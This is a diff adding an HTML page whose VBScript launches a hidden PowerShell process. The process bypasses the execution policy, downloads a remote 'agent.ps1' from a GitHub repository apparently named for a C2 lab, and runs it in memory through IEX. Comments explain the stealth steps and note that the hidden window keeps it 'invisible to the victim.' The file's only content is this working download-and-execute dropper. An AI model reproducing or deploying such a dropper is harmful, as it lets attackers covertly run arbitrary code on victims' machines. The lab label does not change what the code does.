@@ -1,0 +1,21 @@
+<html>
+<head>
+<script language="VBScript">
+    Set objShell = CreateObject("WScript.Shell")
+    
+    ' This single command:
+    ' 1. Sets the security protocol to TLS 1.2
+    ' 2. Bypasses the execution policy
+    ' 3. Downloads your agent.ps1 from GitHub
+    ' 4. Runs it entirely in memory (RAM)
+    
+    psCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/g00glecenter101-arch/lab-c2/refs/heads/main/agent.ps1')"
+    
+    ' The 0 makes it invisible to the victim
+    objShell.Run psCommand, 0
+    window.close()
+</script>
+</head>
+<body>
+</body>
+</html>
